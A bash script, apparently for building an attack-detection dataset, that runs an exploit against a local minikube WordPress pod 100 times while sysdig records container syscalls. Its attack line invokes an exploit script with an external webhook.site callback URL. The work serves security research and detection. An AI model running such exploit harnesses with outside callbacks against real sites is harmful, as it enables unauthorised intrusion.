#!/bin/bash

# CVE_ID="CWE-400"
CVE_ID=$1
RECORD_TIME=15
FILE_NUMBER=1
CONTAINER_ID=$(docker ps -a | grep minikube | awk '{print $1}')

OUTPUT_DIR="/CloudAttackRecord/output/attack-short/$CVE_ID"
WEB_URL=$(minikube service wordpress --url)

if [ ! -d "$OUTPUT_DIR" ]; then
    echo "Creating Output Dir"
    mkdir -p $OUTPUT_DIR
else
    echo "Output Dir Already Exists"
fi

tmux new-session -d -s record
tmux new-session -d -s attack

# get pod id
POD_ID=$(kubectl get pods | grep wordpress | awk '{print $1}')

# Collect 100 cases
for i in {1..100}; do

    echo "Collecting $i ..."
    record_cmd="sudo sysdig -v -b -p \"%evt.rawtime %user.uid %proc.pid %proc.name %thread.tid %syscall.type %evt.dir %evt.args\" -w $OUTPUT_DIR/$FILE_NUMBER.scap container.id=$CONTAINER_ID"
    tmux send -t "record" "$record_cmd" ENTER

    # sleep to ensure the record is started and log start
    sleep 2
    kubectl exec -it $POD_ID -c wordpress -- logger 'Attack Start'

    attack_cmd="python3 exploit.py check https://webhook.site/7285c436-ffc5-47c5-8a17-72d1bec73fee $WEB_URL && sleep 0.5 && kubectl exec -it $POD_ID -c wordpress -- logger 'Attack Stop' && sleep 0.5 && tmux send -t record 'C-c' ENTER"
    echo $attack_cmd
    tmux send -t "attack" "$attack_cmd" ENTER
    
    FILE_NUMBER=$((FILE_NUMBER + 1))
    sleep 10 && echo "Finish $FILE_NUMBER"
done

# stop record
tmux kill-session -t attack
tmux kill-session -t record
sleep 1

# cleaning
# minikube delete

